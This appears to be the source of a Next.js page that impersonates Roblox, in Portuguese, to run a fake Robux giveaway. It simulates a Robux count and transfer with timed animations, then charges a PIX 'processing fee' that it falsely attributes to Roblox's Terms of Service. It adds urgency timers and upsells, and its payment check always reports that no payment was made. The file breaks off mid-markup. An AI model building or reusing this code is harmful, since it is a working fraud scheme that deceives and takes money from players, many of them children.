"use client"

import { useState, useEffect, useRef } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card } from "@/components/ui/card"
import { CheckCircle2, Zap, Gift, Clock } from "lucide-react"

type Stage = "verification" | "profile" | "packages" | "robux-counting" | "transfer" | "receipt" | "pix-payment"

interface VerificationData {
  username: string
  displayName: string
  description: string
  created: string
  followers: number
  following: number
  friends: number
  presence: string
  badges: string[]
  selectedPackage?: {
    robux: string
    price: string
  }
  orderId?: string
}

interface PixPaymentData {
  qrCode: string
  pixCopyPaste: string
  transactionId: string
}

interface Upsell {
  id: string
  robux: number
  bonus?: number
  price: number
  oldPrice: number
  label: string
}

const RobuxIcon = ({ className }: { className?: string }) => (
  <svg viewBox="0 0 24 24" fill="currentColor" className={className}>
    <path d="M12 2L2 7v10l10 5 10-5V7L12 2zm0 2.18L19.82 8 12 11.82 4.18 8 12 4.18zM4 9.68l7 3.5v7.64l-7 3.5v-7.64l7-3.5z" />
  </svg>
)

async function robustFetch(url: string): Promise<string> {
  try {
    const r = await fetch(url, { credentials: "omit" })
    if (r.ok) return await r.text()
  } catch (e) {
    console.log("[v0] Direct fetch failed, trying fallback")
  }

  try {
    const r = await fetch("https://api.allorigins.win/raw?url=" + encodeURIComponent(url))
    if (r.ok) return await r.text()
  } catch (e) {
    console.log("[v0] AllOrigins fallback failed")
  }

  throw new Error("All fetch routes failed (CORS)")
}

async function robustJson(url: string): Promise<any> {
  const txt = await robustFetch(url)
  try {
    return JSON.parse(txt)
  } catch (e) {
    throw new Error("Invalid JSON")
  }
}

function fmtDate(iso: string): string {
  if (!iso) return "—"
  try {
    return new Date(iso).toLocaleDateString("pt-BR", { year: "numeric", month: "2-digit", day: "2-digit" })
  } catch (_) {
    return "—"
  }
}

export default function RobloxRewardsPage() {
  const [stage, setStage] = useState<Stage>("verification")
  const [username, setUsername] = useState("")
  const [isVerifying, setIsVerifying] = useState(false)
  const [verificationStep, setVerificationStep] = useState("")
  const [data, setData] = useState<VerificationData>({
    username: "",
    displayName: "",
    description: "",
    created: "",
    followers: 0,
    following: 0,
    friends: 0,
    presence: "Offline",
    badges: [],
  })
  const [isTransferring, setIsTransferring] = useState(false)
  const [transferProgress, setTransferProgress] = useState(0)
  const [avatarUrl, setAvatarUrl] = useState("")
  const [hasError, setHasError] = useState(false)
  const [pixData, setPixData] = useState<PixPaymentData | null>(null)
  const [isLoadingPix, setIsLoadingPix] = useState(false)
  const [isCopied, setIsCopied] = useState(false)
  const [showFeePopup, setShowFeePopup] = useState(false)
  const [isVerifyingPayment, setIsVerifyingPayment] = useState(false)
  const [paymentVerified, setPaymentVerified] = useState(false)
  const [email, setEmail] = useState("")
  const [orderId, setOrderId] = useState<string | null>(null)

  const [selectedUpsells, setSelectedUpsells] = useState<string[]>([])
  const [pixTimer, setPixTimer] = useState<number>(900) // 15 minutes in seconds
  const [isTimerActive, setIsTimerActive] = useState(false)
  const [isRegeneratingPix, setIsRegeneratingPix] = useState(false)
  const pixGenerationInProgress = useRef(false)
  const regeneratePixTimeout = useRef<NodeJS.Timeout | null>(null)

  const upsells: Upsell[] = [
    { id: "upsell1", robux: 800, price: 19.9, oldPrice: 39.9, label: "+800 Robux" },
    { id: "upsell2", robux: 1700, bonus: 300, price: 29.9, oldPrice: 59.9, label: "+1.700 Robux" },
    { id: "upsell3", robux: 4500, bonus: 700, price: 69.9, oldPrice: 129.9, label: "+5.200 Robux" },
  ]

  const packages = [
    { robux: "800", price: "R$ 59,90" },
    { robux: "1.700", price: "R$ 117,90" },
    { robux: "4.500", price: "R$ 294,90" },
    { robux: "10.000", price: "R$ 589,90" },
    { robux: "22.500", price: "R$ 1.179,90" },
  ]

  useEffect(() => {
    if (stage === "robux-counting") {
      handleRobuxCounting()
    }
  }, [stage])

  useEffect(() => {
    if (!isTimerActive || pixTimer <= 0) return

    const interval = setInterval(() => {
      setPixTimer((prev) => {
        if (prev <= 1) {
          // Timer expired, regenerate PIX
          handleRegeneratePix()
          return 900 // Reset to 15 minutes
        }
        return prev - 1
      })
    }, 1000)

    return () => clearInterval(interval)
  }, [isTimerActive, pixTimer])

  useEffect(() => {
    return () => {
      if (regeneratePixTimeout.current) {
        clearTimeout(regeneratePixTimeout.current)
      }
    }
  }, [])

  const handleVerify = async () => {
    const cleanUsername = username.replace(/^@/, "").trim()

    if (!cleanUsername) {
      setHasError(true)
      setTimeout(() => setHasError(false), 600)
      return
    }

    setIsVerifying(true)
    setVerificationStep("🔍 Buscando usuário no Roblox...")

    try {
      await new Promise((resolve) => setTimeout(resolve, 800))

      setVerificationStep("📊 Carregando informações do perfil...")

      // Call our server-side API route to fetch user data
      const response = await fetch("/api/roblox/user", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ username: cleanUsername }),
      })

      if (!response.ok) {
        const error = await response.json()
        throw new Error(error.error || "Usuário não encontrado")
      }

      const userData = await response.json()

      setVerificationStep("🖼️ Carregando avatar...")
      await new Promise((resolve) => setTimeout(resolve, 600))

      setVerificationStep("✅ Perfil carregado com sucesso!")
      await new Promise((resolve) => setTimeout(resolve, 500))

      setData({
        username: userData.username,
        displayName: userData.displayName || userData.username,
        description: userData.description || "",
        created: userData.created ? fmtDate(userData.created) : "—",
        followers: 0,
        following: 0,
        friends: 0,
        presence: "Online",
        badges: [],
      })
      setAvatarUrl(userData.avatar)
      setIsVerifying(false)
      setStage("profile")
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : "Erro ao carregar perfil. Tente novamente."
      setVerificationStep(`❌ ${errorMessage}`)
      await new Promise((resolve) => setTimeout(resolve, 3000))
      setIsVerifying(false)
    }
  }

  const handlePackageSelect = async (pkg: (typeof packages)[0]) => {
    setData((prev) => ({ ...prev, selectedPackage: pkg }))
    setStage("robux-counting")
  }

  const handleRobuxCounting = async () => {
    if (!data.selectedPackage) return

    const robuxAmount = Number.parseInt(data.selectedPackage.robux.replace(/\./g, ""))
    const duration = 3000
    const steps = 60
    const increment = robuxAmount / steps
    const interval = duration / steps

    let currentCount = 0
    for (let i = 0; i <= steps; i++) {
      await new Promise((resolve) => setTimeout(resolve, interval))
      currentCount = Math.min(Math.round(increment * i), robuxAmount)
      setTransferProgress(currentCount)
    }

    await new Promise((resolve) => setTimeout(resolve, 1500))

    setStage("transfer")
    setIsTransferring(true)
    setTransferProgress(0)

    const transferDuration = 4000
    const transferSteps = 80
    const transferInterval = transferDuration / transferSteps

    for (let i = 0; i <= transferSteps; i++) {
      await new Promise((resolve) => setTimeout(resolve, transferInterval))
      setTransferProgress(i)
    }

    setShowFeePopup(true)
  }

  const handleContinueToPayment = async () => {
    setShowFeePopup(false)

    for (let i = 80; i <= 100; i++) {
      await new Promise((resolve) => setTimeout(resolve, 20))
      setTransferProgress(i)
    }

    const orderId = `RBX-${Math.floor(1000 + Math.random() * 9000)}`
    setData((prev) => ({ ...prev, orderId }))
    setIsTransferring(false)
    await handleGeneratePix()
  }

  const calculateTotal = () => {
    const baseAmount = 9.99
    const upsellTotal = selectedUpsells.reduce((total, upsellId) => {
      const upsell = upsells.find((u) => u.id === upsellId)
      return total + (upsell?.price || 0)
    }, 0)
    return baseAmount + upsellTotal
  }

  const calculateTotalRobux = () => {
    const baseRobux = Number.parseInt(data.selectedPackage?.robux.replace(/\./g, "") || "0")
    const upsellRobux = selectedUpsells.reduce((total, upsellId) => {
      const upsell = upsells.find((u) => u.id === upsellId)
      return total + (upsell?.robux || 0) + (upsell?.bonus || 0)
    }, 0)
    return baseRobux + upsellRobux
  }

  const toggleUpsell = (upsellId: string) => {
    setSelectedUpsells((prev) => (prev.includes(upsellId) ? prev.filter((id) => id !== upsellId) : [...prev, upsellId]))

    if (stage === "pix-payment" && pixData) {
      if (regeneratePixTimeout.current) {
        clearTimeout(regeneratePixTimeout.current)
      }

      regeneratePixTimeout.current = setTimeout(() => {
        handleRegeneratePix()
      }, 1000)
    }
  }

  const handleRegeneratePix = async () => {
    if (pixGenerationInProgress.current) {
      console.log("[v0] PIX generation already in progress, skipping")
      return
    }

    console.log("[v0] Regenerating PIX with new total")
    setIsRegeneratingPix(true)
    pixGenerationInProgress.current = true

    try {
      const authResponse = await fetch("/api/syncpay/auth", {
        method: "POST",
      })

      if (!authResponse.ok) {
        const errorData = await authResponse.json()
        throw new Error(errorData.error || "Falha ao autenticar")
      }

      const { token } = await authResponse.json()
      const totalAmount = calculateTotal()

      if (totalAmount <= 0) {
        throw new Error("Valor total inválido")
      }

      console.log("[v0] Generating PIX for amount:", totalAmount)

      const pixResponse = await fetch("/api/syncpay/cash-in", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          token,
          amount: totalAmount,
          description: `Robux ${data.selectedPackage?.robux} - Taxa de processamento`,
          username: data.username,
        }),
      })

      if (!pixResponse.ok) {
        const errorData = await pixResponse.json()
        throw new Error(errorData.error || "Falha ao gerar PIX")
      }

      const pixResult = await pixResponse.json()

      const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(pixResult.pixCode)}`

      setPixData({
        qrCode: qrCodeUrl,
        pixCopyPaste: pixResult.pixCode,
        transactionId: pixResult.identifier,
      })

      setPixTimer(900)
      setIsTimerActive(true)
    } catch (error) {
      console.error("Error regenerating PIX:", error)
      const errorMessage = error instanceof Error ? error.message : "Erro ao gerar PIX"
      alert(`❌ ${errorMessage}\n\nPor favor, tente novamente em alguns instantes.`)
    } finally {
      setIsRegeneratingPix(false)
      pixGenerationInProgress.current = false
    }
  }

  const handleGeneratePix = async () => {
    setIsLoadingPix(true)

    try {
      const authResponse = await fetch("/api/syncpay/auth", {
        method: "POST",
      })

      if (!authResponse.ok) {
        throw new Error("Falha ao autenticar")
      }

      const { token } = await authResponse.json()

      const totalAmount = calculateTotal()

      const pixResponse = await fetch("/api/syncpay/cash-in", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          token,
          amount: totalAmount,
          description: `Robux ${data.selectedPackage?.robux} - Taxa de processamento`,
          username: data.username,
        }),
      })

      if (!pixResponse.ok) {
        throw new Error("Falha ao gerar PIX")
      }

      const pixResult = await pixResponse.json()

      const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(pixResult.pixCode)}`

      setPixData({
        qrCode: qrCodeUrl,
        pixCopyPaste: pixResult.pixCode,
        transactionId: pixResult.identifier,
      })

      try {
        const orderResponse = await fetch("/api/orders/create", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            robloxUsername: data.username,
            robuxAmount: calculateTotalRobux(),
            totalPrice: totalAmount,
            email: email || null,
            pixCode: pixResult.pixCode,
            transactionId: pixResult.identifier,
          }),
        })

        if (orderResponse.ok) {
          const { order } = await orderResponse.json()
          setOrderId(order.id)
          console.log("[v0] Order created:", order.id)
        } else {
          console.log("[v0] Order creation failed, but continuing with PIX")
        }
      } catch (orderError) {
        console.log("[v0] Order creation error (non-critical):", orderError)
        // Continue anyway - order creation is optional
      }

      setPixTimer(900)
      setIsTimerActive(true)
      setStage("pix-payment")
    } catch (error) {
      console.error("Error generating PIX:", error)
      alert("Erro ao gerar pagamento PIX. Tente novamente.")
    } finally {
      setIsLoadingPix(false)
    }
  }

  const handleCopyPix = async () => {
    if (pixData?.pixCopyPaste) {
      await navigator.clipboard.writeText(pixData.pixCopyPaste)
      setIsCopied(true)
      setTimeout(() => setIsCopied(false), 2000)
    }
  }

  const handleVerifyPayment = async () => {
    setIsVerifyingPayment(true)

    // Simulate payment verification for 5 seconds
    await new Promise((resolve) => setTimeout(resolve, 5000))

    // For now, always show payment not confirmed
    // In production, this would check the actual payment status
    setIsVerifyingPayment(false)

    // Show error message - payment not confirmed
    alert("❌ Pagamento ainda não foi efetuado. Por favor, realize o pagamento e tente novamente.")
  }

  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  return (
    <div className="min-h-screen flex flex-col relative">
      <style jsx>{`
        @keyframes shake {
          0%,
          100% {
            transform: translateX(0);
          }
          10%,
          30%,
          50%,
          70%,
          90% {
            transform: translateX(-8px);
          }
          20%,
          40%,
          60%,
          80% {
            transform: translateX(8px);
          }
        }
        .shake {
          animation: shake 0.6s;
        }
      `}</style>

      <div
        className="fixed inset-0 bg-cover bg-center z-0"
        style={{
          backgroundImage:
            "url(https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Millions-of-immersive-experiences-on-Roblox-scaled-PUaAaiCfkQiuVA79KQDiJ1XQ17m8GS.png)",
          backgroundAttachment: "fixed",
          backgroundSize: "cover",
          backgroundPosition: "center",
          backgroundRepeat: "no-repeat",
        }}
      />
      <div className="fixed inset-0 bg-black/60 z-0" />

      <header className="relative z-10 bg-[#1a1a1a]/95 backdrop-blur-sm py-2 px-3 sm:py-3 sm:px-4 md:py-4 md:px-6 lg:py-5 lg:px-8 flex justify-center items-center shadow-lg border-b border-white/10">
        <img
          src="/images/design-mode/Roblox_Logo(1).webp"
          alt="Roblox"
          className="h-10 sm:h-14 md:h-16 lg:h-20 xl:h-24 invert"
        />
      </header>

      <main className="flex-1 relative flex items-center justify-center px-3 py-4 sm:px-4 sm:py-6 md:px-6 md:py-8 lg:py-10 z-10">
        <div className="w-full max-w-2xl">
          {/* Stage 1: Verification */}
          {stage === "verification" && (
            <Card className="bg-[#1e1e1e]/95 border-border/50 p-4 sm:p-5 md:p-6 lg:p-8 backdrop-blur-sm">
              <div className="space-y-3 sm:space-y-4 md:space-y-5">
                <div className="text-center space-y-1.5 sm:space-y-2">
                  <h2 className="text-base sm:text-lg md:text-xl lg:text-2xl font-semibold text-white flex items-center justify-center gap-2 flex-wrap">
                    Verificação de Conta Roblox
                  </h2>
                  <p className="text-white/70 text-xs sm:text-sm leading-relaxed px-2">
                    Para liberar seu bônus de Robux, confirme os dados da sua conta Roblox. Digite seu nome de usuário
                    para começar.
                  </p>
                </div>

                {!isVerifying ? (
                  <div className="space-y-3 sm:space-y-4">
                    <div>
                      <label className="text-white/90 text-xs sm:text-sm mb-1.5 sm:mb-2 block">Nome de Usuário</label>
                      <Input
                        placeholder="@roblox"
                        value={username}
                        onChange={(e) => setUsername(e.target.value)}
                        onKeyDown={(e) => e.key === "Enter" && handleVerify()}
                        className="bg-black/30 border-white/20 text-white placeholder:text-white/40 h-11 sm:h-12 md:h-14 text-sm sm:text-base"
                      />
                    </div>

                    <Button
                      onClick={handleVerify}
                      className={`w-full font-semibold py-3 sm:py-4 md:py-5 text-sm sm:text-base md:text-lg mt-2 transition-colors ${
                        hasError
                          ? "bg-red-600 hover:bg-red-700 text-white shake"
                          : "bg-white/90 hover:bg-white text-black"
                      }`}
                    >
                      VERIFICAR
                    </Button>

                    <p className="text-white/40 text-[10px] sm:text-xs text-center flex items-center justify-center gap-2 mt-2 sm:mt-3">
                      Não solicitaremos sua senha.
                    </p>
                  </div>
                ) : (
                  <div className="space-y-3 sm:space-y-4 py-4 sm:py-6 md:py-8">
                    <div className="flex flex-col items-center justify-center gap-2 sm:gap-3 text-white text-center">
                      <img
                        src="/images/design-mode/Black%20Simple%20Record%20Vlog%20Youtube%20Intro%20%281%29.png"
                        alt="Loading"
                        className="w-10 h-10 sm:w-12 sm:h-12 md:w-14 md:h-14"
                      />
                      <span className="text-xs sm:text-sm md:text-base px-4">{verificationStep}</span>
                    </div>
                  </div>
                )}
              </div>
            </Card>
          )}

          {/* Stage 2: Profile */}
          {stage === "profile" && (
            <div className="space-y-3 sm:space-y-4 md:space-y-5">
              <Card className="bg-[#1e1e1e]/95 border-border/50 p-4 sm:p-5 md:p-6 backdrop-blur-sm">
                <div className="space-y-3 sm:space-y-4">
                  <div className="flex flex-col sm:flex-row items-center gap-3 sm:gap-4">
                    <div className="w-16 h-16 sm:w-20 sm:h-20 md:w-24 md:h-24 rounded-full bg-primary/20 flex items-center justify-center overflow-hidden flex-shrink-0 border-2 border-primary/30">
                      {avatarUrl ? (
                        <img
                          src={avatarUrl || "/placeholder.svg"}
                          alt={`${data.username} avatar`}
                          className="w-full h-full object-cover"
                        />
                      ) : (
                        <span className="text-2xl sm:text-3xl md:text-4xl">👤</span>
                      )}
                    </div>
                    <div className="flex-1 text-center sm:text-left">
                      <div className="flex items-center justify-center sm:justify-start gap-1.5 sm:gap-2 flex-wrap">
                        <h3 className="text-base sm:text-lg md:text-xl lg:text-2xl font-semibold text-white">
                          {data.displayName}
                        </h3>
                        <CheckCircle2 className="w-4 h-4 sm:w-5 sm:h-5 text-green-400" />
                      </div>
                      <p className="text-white/60 text-xs sm:text-sm md:text-base">@{data.username}</p>
                      <div className="flex items-center justify-center sm:justify-start gap-1.5 sm:gap-2 mt-1.5 sm:mt-2">
                        <div className="w-1.5 h-1.5 sm:w-2 sm:h-2 rounded-full bg-green-500 animate-pulse" />
                        <span className="text-green-400 text-xs sm:text-sm font-medium">Online</span>
                      </div>
                    </div>
                  </div>

                  <div className="text-white/40 text-[10px] sm:text-xs pt-2 sm:pt-3 border-t border-white/10 text-center">
                    Conta criada em: {data.created}
                  </div>
                </div>
              </Card>

              <div className="text-center px-2">
                <Button
                  onClick={() => setStage("packages")}
                  className="bg-primary hover:bg-primary/90 text-white font-semibold px-6 sm:px-8 py-3 sm:py-4 md:py-5 text-sm sm:text-base md:text-lg w-full sm:w-auto"
                >
                  Continuar para Pacotes
                </Button>
              </div>
            </div>
          )}

          {/* Stage 3: Packages */}
          {stage === "packages" && (
            <div className="space-y-3 sm:space-y-4 md:space-y-5">
              <Card className="bg-[#1e1e1e]/95 border-border/50 p-4 sm:p-5 md:p-6 backdrop-blur-sm">
                <div className="flex flex-col items-center gap-2 sm:gap-3 mb-3 sm:mb-4 md:mb-5">
                  <img
                    src="/images/design-mode/Black%20Simple%20Record%20Vlog%20Youtube%20Intro%20%281%29.png"
                    alt="Loading"
                    className="w-10 h-10 sm:w-12 sm:h-12 md:w-14 md:h-14"
                  />
                  <h2 className="text-base sm:text-lg md:text-xl lg:text-2xl font-semibold text-white text-center px-2">
                    Selecione seu Pacote de Robux
                  </h2>
                </div>
                <div className="space-y-2 sm:space-y-2.5">
                  {packages.map((pkg, idx) => (
                    <Button
                      key={idx}
                      onClick={() => handlePackageSelect(pkg)}
                      className="w-full bg-primary hover:bg-primary/90 text-white font-semibold py-4 sm:py-5 md:py-6 text-sm sm:text-base md:text-lg flex items-center justify-center gap-2 sm:gap-3 transition-transform hover:scale-[1.02] active:scale-[0.98]"
                    >
                      <img
                        src="/images/design-mode/Black%20Simple%20Record%20Vlog%20Youtube%20Intro%20%281%29.png"
                        alt="Robux"
                        className="w-5 h-5 sm:w-6 sm:h-6 md:w-8 md:h-8"
                      />
                      <span className="text-base sm:text-lg md:text-xl lg:text-2xl font-bold">{pkg.robux}</span>
                    </Button>
                  ))}
                </div>
              </Card>
            </div>
          )}

          {/* Stage 4: Robux Counting Animation */}
          {stage === "robux-counting" && data.selectedPackage && (
            <Card className="bg-[#1e1e1e]/95 border-border/50 p-4 sm:p-6 md:p-8 lg:p-10 backdrop-blur-sm">
              <div className="space-y-4 sm:space-y-5 md:space-y-6 text-center">
                <div className="flex justify-center">
                  <img
                    src="/images/design-mode/Black%20Simple%20Record%20Vlog%20Youtube%20Intro%20%281%29(1).png"
                    alt="Robux"
                    className="w-20 h-20 sm:w-24 sm:h-24 md:w-32 md:h-32 lg:w-40 lg:h-40 animate-pulse"
                  />
                </div>

                <div className="space-y-1.5 sm:space-y-2">
                  <p className="text-white/60 text-xs sm:text-sm md:text-base">Preparando seus Robux...</p>
                  <div className="text-3xl sm:text-4xl md:text-5xl lg:text-6xl font-bold text-primary">
                    {transferProgress.toLocaleString("pt-BR")}
                  </div>
                  <p className="text-white/40 text-xs sm:text-sm px-4">
                    de {Number.parseInt(data.selectedPackage.robux.replace(/\./g, "")).toLocaleString("pt-BR")} Robux
                  </p>
                </div>

                {transferProgress === Number.parseInt(data.selectedPackage.robux.replace(/\./g, "")) && (
                  <div className="space-y-2 sm:space-y-3 animate-in fade-in duration-500">
                    <div className="flex justify-center">
                      <CheckCircle2 className="w-10 h-10 sm:w-12 sm:h-12 md:w-16 md:h-16 text-green-400" />
                    </div>
                    <p className="text-green-400 font-semibold text-sm sm:text-base md:text-lg px-4">
                      ✅ Robux confirmados com sucesso!
                    </p>
                    <p className="text-white/60 text-xs sm:text-sm">Preparando transferência...</p>
                  </div>
                )}
              </div>
            </Card>
          )}

          {/* Stage 5: Transfer with Popup */}
          {stage === "transfer" && (
            <>
              <Card
                className={`bg-[#1e1e1e]/95 border-border/50 p-4 sm:p-5 md:p-6 backdrop-blur-sm transition-all ${showFeePopup ? "blur-sm" : ""}`}
              >
                <div className="space-y-3 sm:space-y-4 md:space-y-5 text-center">
                  <div className="flex items-center justify-center gap-2 sm:gap-3 text-white flex-wrap px-2">
                    <img
                      src="/images/design-mode/Black%20Simple%20Record%20Vlog%20Youtube%20Intro%20%281%29.png"
                      alt="Loading"
                      className="w-8 h-8 sm:w-10 sm:h-10 md:w-12 md:h-12"
                    />
                    <span className="text-xs sm:text-sm md:text-base lg:text-lg font-semibold">
                      Confirmando transferência de Robux...
                    </span>
                  </div>

                  <div className="space-y-1.5 sm:space-y-2">
                    <div className="w-full bg-black/30 rounded-full h-2 sm:h-2.5 md:h-3 overflow-hidden">
                      <div
                        className="h-full bg-primary transition-all duration-300"
                        style={{ width: `${transferProgress}%` }}
                      />
                    </div>
                    <p className="text-white/60 text-xs sm:text-sm">{transferProgress}%</p>
                  </div>

                  {transferProgress === 100 && (
                    <div className="text-green-400 font-semibold text-xs sm:text-sm md:text-base px-4">
                      Transferência confirmada com sucesso!
                    </div>
                  )}
                </div>
              </Card>

              {showFeePopup && (
                <div className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-4">
                  <div className="absolute inset-0 bg-black/70 backdrop-blur-sm" onClick={() => {}} />
                  <Card className="relative bg-[#2a2a2a] border-white/10 p-4 sm:p-5 md:p-6 max-w-lg w-full shadow-2xl animate-in fade-in zoom-in duration-300 max-h-[90vh] flex flex-col mx-3">
                    <div className="space-y-3 sm:space-y-4">
                      <div className="text-center space-y-1.5 sm:space-y-2">
                        <div className="flex justify-center">
                          <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-full bg-yellow-500/20 flex items-center justify-center border-2 border-yellow-500/30">
                            <svg
                              className="w-5 h-5 sm:w-6 sm:h-6 text-yellow-500"
                              fill="none"
                              stroke="currentColor"
                              viewBox="0 0 24 24"
                            >
                              <path
                                strokeLinecap="round"
                                strokeLinejoin="round"
                                strokeWidth={2}
                                d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"
                              />
                            </svg>
                          </div>
                        </div>
                        <h3 className="text-sm sm:text-base md:text-lg font-bold text-white px-2">
                          Taxa de Processamento Necessária
                        </h3>
                      </div>

                      <div className="bg-[#1e1e1e] border border-white/10 rounded-lg p-3 sm:p-4 space-y-2 sm:space-y-2.5">
                        <p className="text-white/90 text-xs sm:text-sm leading-relaxed">
                          De acordo com os{" "}
                          <a
                            href="https://en.help.roblox.com/hc/pt-br/articles/115004647846-Termos-de-Uso-da-Roblox"
                            target="_blank"
                            rel="noopener noreferrer"
                            className="font-semibold text-blue-400 hover:text-blue-300 underline decoration-blue-400/50 hover:decoration-blue-300 transition-colors"
                          >
                            Termos de Serviço Oficiais da Roblox
                          </a>
                          , todas as transferências de Robux estão sujeitas a uma taxa de processamento para garantir a
                          segurança e autenticidade da transação.
                        </p>

                        <div className="bg-[#151515] border border-white/5 rounded-lg p-2.5 sm:p-3 text-center">
                          <p className="text-white/60 text-[10px] sm:text-xs mb-1 font-medium">
                            Taxa de Processamento:
                          </p>
                          <p className="text-primary font-bold text-xl sm:text-2xl md:text-3xl">R$ 9,99</p>
                          <p className="text-white/50 text-[10px] sm:text-xs mt-1">Pagamento único via PIX</p>
                        </div>
                      </div>

                      <div className="bg-[#1e1e1e] border border-green-500/20 rounded-lg p-3 sm:p-4">
                        <div className="flex items-start gap-2">
                          <div className="flex-shrink-0 mt-0.5">
                            <CheckCircle2 className="w-4 h-4 text-green-400" />
                          </div>
                          <div className="space-y-0.5">
                            <p className="text-white font-semibold text-xs sm:text-sm">Garantia de Entrega</p>
                            <p className="text-white/70 text-xs leading-relaxed">
                              Após a confirmação do pagamento, seus{" "}
                              <span className="font-semibold text-white">{data.selectedPackage?.robux} Robux</span>{" "}
                              serão transferidos automaticamente para sua conta{" "}
                              <span className="font-semibold text-white break-all">@{data.username}</span> em até 5
                              minutos.
                            </p>
                          </div>
                        </div>
                      </div>

                      <Button
                        onClick={handleContinueToPayment}
                        className="w-full bg-primary hover:bg-primary/90 text-white font-semibold py-3 sm:py-4 text-sm sm:text-base transition-all hover:scale-[1.02] active:scale-[0.98]"
                      >
                        Continuar
                      </Button>

                      <p className="text-white/40 text-[10px] sm:text-xs leading-relaxed px-2 text-center">
                        Esta taxa é cobrada pela Roblox Corporation para processar transferências de Robux de forma
                        segura e oficial.
                      </p>
                    </div>
                  </Card>
                </div>
              )}
            </>
          )}

          {/* Stage 7: PIX Payment */}
          {stage === "pix-payment" && pixData && (
            <Card className="bg-[#1e1e1e]/95 border-border/50 p-3 sm:p-4 md:p-5 lg:p-6 backdrop-blur-sm">
              <div className="space-y-3 sm:space-y-4 md:space-y-5">
                <div className="text-center space-y-1.5 sm:space-y-2 pb-3 sm:pb-4 border-b border-white/10">
                  <h2 className="text-lg sm:text-xl md:text-2xl lg:text-3xl font-bold text-white px-2">
                    🎁 Finalize e Receba Seus Robux!
                  </h2>
                  <p className="text-white/60 text-xs sm:text-sm">Pagamento rápido e seguro via PIX</p>

                  

                  <div className="flex items-center justify-center gap-1.5 sm:gap-2 bg-red-500/20 border border-red-500/50 rounded-lg px-3 py-1.5 sm:py-2 mt-2 sm:mt-3">
                    <Clock className="w-4 h-4 sm:w-5 sm:h-5 text-red-400 animate-pulse" />
                    <span className="text-red-300 font-bold text-sm sm:text-base md:text-lg">
                      {formatTimer(pixTimer)}
                    </span>
                    <span className="text-red-300/80 text-[10px] sm:text-xs">para expirar</span>
                  </div>
                </div>

                <div className="bg-gradient-to-br from-yellow-500/20 via-orange-500/20 to-red-500/20 border-2 border-yellow-500/50 rounded-xl p-3 sm:p-4 md:p-5 relative overflow-hidden">
                  <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/5 to-transparent animate-pulse" />

                  <div className="relative z-10 space-y-2.5 sm:space-y-3 md:space-y-4">
                    <div className="text-center space-y-1 sm:space-y-1.5">
                      <div className="inline-flex items-center gap-1 sm:gap-1.5 bg-red-600 text-white text-[10px] sm:text-xs font-bold px-2 py-1 sm:px-3 sm:py-1.5 rounded-full animate-pulse">
                        <Zap className="w-3 h-3 sm:w-4 sm:h-4" />
                        OFERTA POR TEMPO LIMITADO!
                        <Zap className="w-3 h-3 sm:w-4 sm:h-4" />
                      </div>
                      <h3 className="text-base sm:text-lg md:text-xl lg:text-2xl font-black text-white px-2">
                        🔥 Turbine Seus Robux AGORA!
                      </h3>
                      <p className="text-white/80 text-xs sm:text-sm px-2">
                        Adicione mais Robux ao seu pedido com desconto especial
                      </p>
                    </div>

                    <div className="space-y-2 sm:space-y-2.5">
                      {upsells.map((upsell) => {
                        const isSelected = selectedUpsells.includes(upsell.id)
                        return (
                          <button
                            key={upsell.id}
                            onClick={() => toggleUpsell(upsell.id)}
                            className={`w-full p-2.5 sm:p-3 md:p-4 rounded-lg border-2 transition-all ${
                              isSelected
                                ? "bg-primary/30 border-primary shadow-lg shadow-primary/20 scale-[1.02]"
                                : "bg-[#2a2a2a] border-white/20 hover:border-white/40 hover:bg-[#333]"
                            }`}
                          >
                            <div className="flex items-center justify-between gap-2">
                              <div className="flex items-center gap-2 flex-1 min-w-0">
                                <div
                                  className={`w-5 h-5 sm:w-6 sm:h-6 rounded-full border-2 flex items-center justify-center flex-shrink-0 ${
                                    isSelected ? "bg-primary border-primary" : "border-white/40"
                                  }`}
                                >
                                  {isSelected && <CheckCircle2 className="w-3 h-3 sm:w-4 sm:h-4 text-white" />}
                                </div>
                                <div className="text-left min-w-0 flex-1">
                                  <div className="flex items-center gap-1 sm:gap-1.5 flex-wrap">
                                    <img
                                      src="/images/design-mode/Black%20Simple%20Record%20Vlog%20Youtube%20Intro%20%281%29.png"
                                      alt="Robux"
                                      className="w-4 h-4 sm:w-5 sm:h-5 flex-shrink-0"
                                    />
                                    <p className="text-white font-bold text-xs sm:text-sm md:text-base truncate">
                                      {upsell.label}
                                    </p>
                                    {upsell.bonus && (
                                      <span className="bg-green-500 text-white text-[9px] sm:text-[10px] font-bold px-1 sm:px-1.5 py-0.5 rounded flex-shrink-0">
                                        +{upsell.bonus} BÔNUS
                                      </span>
                                    )}
                                  </div>
                                  <p className="text-white/60 text-[10px] sm:text-xs">
                                    {upsell.bonus
                                      ? `${upsell.robux.toLocaleString("pt-BR")} Robux + ${upsell.bonus} de bônus`
                                      : `${upsell.robux.toLocaleString("pt-BR")} Robux`}
                                  </p>
                                </div>
                              </div>
                              <div className="text-right flex-shrink-0">
                                <p className="text-white/50 text-[10px] sm:text-xs line-through">
                                  R$ {upsell.oldPrice.toFixed(2).replace(".", ",")}
                                </p>
                                <p className="text-primary font-black text-sm sm:text-base md:text-lg">
                                  R$ {upsell.price.toFixed(2).replace(".", ",")}
                                </p>
                              </div>
                            </div>
                          </button>
                        )
                      })}
                    </div>

